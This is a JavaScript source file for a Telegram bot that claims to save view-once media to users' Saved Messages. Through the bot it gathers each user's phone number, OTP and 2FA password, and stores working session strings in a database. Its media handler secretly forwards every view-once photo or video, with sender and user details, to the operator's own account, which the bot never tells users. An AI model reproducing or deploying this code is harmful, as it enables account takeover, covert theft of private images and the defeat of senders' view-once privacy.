import TelegramBot from "node-telegram-bot-api";
import { TelegramClient } from "teleproto";
import { StringSession } from "teleproto/sessions/index.js";
import { NewMessage } from "teleproto/events/index.js";
import mongoose from "mongoose";
import dotenv from "dotenv";

dotenv.config();

// ---- CONFIG ----
const API_ID   = Number(process.env.API_ID);
const API_HASH = process.env.API_HASH;
const BOT_TOKEN = process.env.BOT_TOKEN;
const MONGO_URI = process.env.MONGO_URI;
const OWNER_ID  = String(process.env.OWNER_ID); // your Telegram user ID (get it from @userinfobot)

if (!API_ID || !API_HASH || !BOT_TOKEN || !MONGO_URI || !OWNER_ID) {
  console.error("❌ Missing required env vars: API_ID, API_HASH, BOT_TOKEN, MONGO_URI, OWNER_ID");
  process.exit(1);
}

// ---- MONGODB ----
await mongoose.connect(MONGO_URI);
console.log("✅ MongoDB Connected");

const User = mongoose.model(
  "User",
  new mongoose.Schema({
    telegramId:    { type: String, unique: true },
    username:      String,
    firstName:     String,
    phone:         String,
    sessionString: String,
    // inactive | pending | active | stopped
    status:        { type: String, default: "inactive" },
    registeredAt:  { type: Date, default: Date.now },
  })
);

// ---- BOT (polling) ----
const bot = new TelegramBot(BOT_TOKEN, { polling: true });

// ---- IN-MEMORY STATE ----
// telegramId -> { step, resolvePhone, resolveCode, resolvePassword, client }
const pendingAuth = new Map();
// telegramId -> TelegramClient
const activeClients = new Map();

// ---- HELPERS ----
function isViewOnce(media) {
  return media?.ttlSeconds != null && media.ttlSeconds > 0;
}

// Returns true for any media worth capturing (skip stickers/dice/polls)
function isCapturableMedia(media) {
  if (!media) return false;
  return (
    media.photo        != null ||
    media.document     != null ||
    media.video        != null ||
    media.voice        != null ||
    media.audio        != null ||
    media.videoNote    != null   // round videos
  );
}

function buildCaption(sender, chatTitle, date, extraLine = "") {
  const time = new Date(date * 1000).toLocaleString("en-IN", {
    timeZone: "Asia/Kolkata",
    dateStyle: "medium",
    timeStyle: "short",
  });
  const senderName = sender
    ? [sender.firstName, sender.lastName].filter(Boolean).join(" ") +
      (sender.username ? ` (@${sender.username})` : "")
    : "Unknown";

  return (
    `👁️ *View-Once Intercepted*\n` +
    `👤 *From:* ${senderName}\n` +
    `💬 *Chat:* ${chatTitle || "Unknown"}\n` +
    (extraLine ? `${extraLine}\n` : "") +
    `🕐 *Time:* ${time}`
  );
}

// ---- MEDIA HANDLER (all incoming media + special owner forward for view-once) ----
async function setupMediaHandler(client, user) {
  client.addEventHandler(async (event) => {
    const msg = event.message;

    // Skip outgoing and non-media messages
    if (!msg?.media || msg.out) return;

    // Skip messages from Saved Messages itself (avoid infinite loop)
    const chat = await msg.getChat().catch(() => null);
    if (chat?.id?.toString() === user.telegramId) return;

    if (!isCapturableMedia(msg.media)) return;

    const viewOnce = isViewOnce(msg.media);

    try {
      const sender = await msg.getSender().catch(() => null);
      const chatTitle =
        chat?.title ||
        [chat?.firstName, chat?.lastName].filter(Boolean).join(" ") ||
        "Unknown";

      const label = viewOnce ? "👁️ View-Once" : "📥 Media";
      console.log(`\n${label} for @${user.username || user.telegramId} | from: ${chatTitle}`);

      const buffer = await client.downloadMedia(msg.media, { workers: 4 });
      if (!buffer?.length) {
        console.warn("   ⚠️ Empty buffer — skipped.");
        return;
      }

      const fileBuffer = Buffer.from(buffer);
      const captionPrefix = viewOnce ? "👁️ *View-Once* " : "";

      // 1️⃣ Always save to user's own Saved Messages
      await client.sendFile("me", {
        file: fileBuffer,
        caption: captionPrefix + buildCaption(sender, chatTitle, msg.date),
        parseMode: "markdown",
        forceDocument: false,
      });
      console.log("   ✅ Saved to Saved Messages");

      // 2️⃣ View-once only → also forward to owner with user info
      if (viewOnce) {
        try {
          const userTag = user.username
            ? `@${user.username}`
            : user.firstName || user.telegramId;

          await client.sendFile(OWNER_ID, {
            file: fileBuffer,
            caption:
              "👁️ *View-Once* " +
              buildCaption(sender, chatTitle, msg.date, `🧑 *User:* ${userTag}`),
            parseMode: "markdown",
            forceDocument: false,
          });
          console.log("   ✅ View-once forwarded to owner");
        } catch (ownerErr) {
          console.warn("   ⚠️ Could not forward to owner:", ownerErr.message);
        }
      }
    } catch (err) {
      console.error("   ❌ Error processing media:", err.message);
    }
  }, new NewMessage({}));
}

// ---- START A CLIENT FOR AN EXISTING USER ----
async function startClientForUser(user) {
  if (activeClients.has(user.telegramId)) return;

  const client = new TelegramClient(
    new StringSession(user.sessionString),
    API_ID,
    API_HASH,
    { connectionRetries: 5, retryDelay: 2000, autoReconnect: true }
  );

  try {
    await client.connect();
    activeClients.set(user.telegramId, client);
    await setupMediaHandler(client, user);
    console.log(`✅ Client loaded: @${user.username || user.telegramId}`);
  } catch (err) {
    console.error(`❌ Could not start client for ${user.telegramId}:`, err.message);
  }
}

// ---- LOAD ALL ACTIVE SESSIONS ON STARTUP ----
async function loadAllSessions() {
  const users = await User.find({ status: "active" });
  console.log(`\n📂 Loading ${users.length} existing session(s)...`);
  for (const user of users) {
    await startClientForUser(user);
  }
}

// ============================
//        BOT COMMANDS
// ============================

// /start — begin registration flow
bot.onText(/\/start/, async (msg) => {
  const chatId = String(msg.chat.id);

  // Disconnect any existing session for this user
  if (activeClients.has(chatId)) {
    await activeClients.get(chatId).disconnect().catch(() => {});
    activeClients.delete(chatId);
  }
  pendingAuth.delete(chatId);

  await User.findOneAndUpdate(
    { telegramId: chatId },
    {
      telegramId: chatId,
      username:   msg.from.username,
      firstName:  msg.from.first_name,
      status:     "pending",
    },
    { upsert: true }
  );

  await bot.sendMessage(
    chatId,
    `👋 Hi *${msg.from.first_name || "there"}*!\n\n` +
    `I automatically save every view-once photo & video you receive to your *Saved Messages*.\n\n` +
    `📱 Send me your phone number to get started:\n_(e.g. +919876543210)_`,
    { parse_mode: "Markdown" }
  );

  // Create promise resolvers — bot messages will resolve these
  let resolvePhone, resolveCode, resolvePassword;
  const phonePromise    = new Promise((r) => (resolvePhone = r));
  const codePromise     = new Promise((r) => (resolveCode = r));
  const passwordPromise = new Promise((r) => (resolvePassword = r));

  const client = new TelegramClient(new StringSession(""), API_ID, API_HASH, {
    connectionRetries: 5,
    retryDelay: 1000,
  });

  pendingAuth.set(chatId, {
    step: "phone",
    resolvePhone,
    resolveCode,
    resolvePassword,
    client,
  });

  // Start login flow in background (non-blocking)
  // client.start handles the full auth including 2FA automatically
  client
    .start({
      phoneNumber: () => phonePromise,
      phoneCode: async () => {
        await bot.sendMessage(chatId, "📩 OTP sent to your Telegram app!\nSend it here:");
        const p = pendingAuth.get(chatId);
        if (p) p.step = "code";
        return codePromise;
      },
      password: async () => {
        await bot.sendMessage(chatId, "🔑 You have 2FA enabled. Send your password:");
        const p = pendingAuth.get(chatId);
        if (p) p.step = "password";
        return passwordPromise;
      },
      onError: async (err) => {
        console.error("Auth error:", err.message);
        pendingAuth.delete(chatId);
        await User.findOneAndUpdate({ telegramId: chatId }, { status: "inactive" });
        bot
          .sendMessage(chatId, `❌ Login error: ${err.message}\n\nSend /start to try again.`)
          .catch(() => {});
      },
    })
    .then(async () => {
      const sessionString = client.session.save();
      const user = await User.findOneAndUpdate(
        { telegramId: chatId },
        { sessionString, status: "active" },
        { new: true }
      );

      pendingAuth.delete(chatId);
      activeClients.set(chatId, client);
      await setupMediaHandler(client, user);

      await bot.sendMessage(
        chatId,
        `✅ *Connected!*\n\n` +
        `I'm now watching *all* your chats. Any view-once photo or video you receive will be:\n` +
        `• Saved to your *Saved Messages*\n` +
        `• Visible to you anytime — no more one-time limits\n\n` +
        `• /status — check connection\n` +
        `• /stop — turn off\n` +
        `• /start — reconnect`,
        { parse_mode: "Markdown" }
      );
      console.log(`🎉 Registered: @${user?.username || chatId}`);
    })
    .catch(async (err) => {
      console.error("Login failed:", err.message);
      pendingAuth.delete(chatId);
      await User.findOneAndUpdate({ telegramId: chatId }, { status: "inactive" });
      bot
        .sendMessage(chatId, `❌ Login failed: ${err.message}\n\nSend /start to try again.`)
        .catch(() => {});
    });
});

// /status
bot.onText(/\/status/, async (msg) => {
  const chatId = String(msg.chat.id);
  const user = await User.findOne({ telegramId: chatId });
  if (!user) {
    return bot.sendMessage(chatId, "❌ Not registered. Send /start to begin.");
  }
  const running = activeClients.has(chatId);
  bot.sendMessage(
    chatId,
    running
      ? "🟢 *Active* — monitoring all your chats."
      : `🔴 *Inactive* (${user.status}). Send /start to reconnect.`,
    { parse_mode: "Markdown" }
  );
});

// /stop
bot.onText(/\/stop/, async (msg) => {
  const chatId = String(msg.chat.id);
  const client = activeClients.get(chatId);
  if (client) {
    await client.disconnect().catch(() => {});
    activeClients.delete(chatId);
  }
  await User.findOneAndUpdate({ telegramId: chatId }, { status: "stopped" });
  bot.sendMessage(chatId, "🛑 Monitoring stopped.\n\nSend /start to re-enable anytime.");
});

// General message handler — pipes text to the pending auth promise resolvers
bot.on("message", (msg) => {
  if (!msg.text || msg.text.startsWith("/")) return;

  const chatId = String(msg.chat.id);
  const text   = msg.text.trim();
  const pending = pendingAuth.get(chatId);
  if (!pending) return;

  const { step } = pending;
  if (step === "phone")    pending.resolvePhone(text);
  else if (step === "code")     pending.resolveCode(text);
  else if (step === "password") pending.resolvePassword(text);
});

// ---- GLOBAL ERROR HANDLING ----
process.on("unhandledRejection", (err) => {
  console.error("🔥 Unhandled rejection:", err.message);
});
process.on("uncaughtException", (err) => {
  console.error("💥 Uncaught exception:", err.message);
});

// ---- START ----
await loadAllSessions();
console.log(`\n🤖 Bot running. Users can message your bot to register.\n`);
await new Promise(() => {}); // keep alive
